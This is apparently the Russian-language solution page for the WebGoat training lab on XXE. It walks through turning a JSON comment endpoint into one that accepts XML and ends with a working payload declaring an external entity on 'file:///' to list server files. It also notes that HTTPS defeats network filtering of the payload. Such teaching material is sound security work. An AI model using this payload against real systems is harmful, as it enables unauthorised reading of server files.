=== Решение задачи

Идея этой задачи заключается в том, что хотя может показаться, что приложение принимает только JSON, но если мы изменим текст сообщения на XML, фреймворк может его обработать. Когда вы попытаетесь ввести комментарий, текст запроса будет:

[source, json]
----
{"text":"Мой первый комментарий"}
----

Это обычное сообщение JSON, давайте попробуем изменить тип содержимого запроса.

[source]
----
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

{"text":"Мой первый комментарий"}
----

это приводит к следующему исключению:

[source]
----
javax.xml.bind.UnmarshalException\n - with linked exception:\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,1]\nMessage: Содержание не допускается в прологе.
----

В зависимости от XML-парсера вы можете получить лучшее сообщение об ошибке, в этом случае сообщение немного криптическое, это означает, что мы не отправляем допустимый xml. Например, библиотека Jackson выдает следующее сообщение:

[source]
----
JSON parse error: Unexpected character '{' (code 123) in prolog; expected
      '<'\n at [row,col {unknown-source}]: [1,1]; nested exception is com.fasterxml.jackson.core.JsonParseException:
      Unexpected character '{' (code 123) in prolog; expected '<'\n at [row,col {unknown-source}]: [1,1]“
----

Это сообщение об ошибке появляется, поскольку мы все еще отправляем сообщение JSON в конечную точку, поэтому, если мы перехватим и изменим сообщение JSON на сообщение XML:

[source]
----
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<text>Это мое первое сообщение.</text>
----

Снова сообщение об ошибке от конечной точки:

[source]
----
"javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[com.sun.istack.SAXParseException2; lineNumber: 1; columnNumber: 7; unexpected element (uri:\\\"\\\", local:\\\"text\\\"). Expected elements are <{}comment>]
----

Парсер жалуется, что сообщение не является допустимым XML-сообщением и его необходимо встроить в tag `comment`:

[source, xml]
----
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<comment><text>Это мое первое сообщение.</text></comment>
----

Конечная точка больше не жалуется, и если вы обновите страницу в WebGoat, опубликованные комментарии появятся. Чтобы атака сработала, нам нужно опубликовать:

[source, xml]
----
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;Это мое первое сообщение.</text></comment>
----

В некоторых корпоративных сетях некоторые сетевые устройства могут полностью отбрасывать эту полезную нагрузку, если она была отправлена по HTTP. В этом случае ответ на `POST` не возвращается, и конечная точка никогда не получает запрос. Однако такие виды защиты имеют ограниченное применение, поскольку тот же запрос будет успешно передан в настройке HTTPS, где эта полезная нагрузка будет зашифрована.
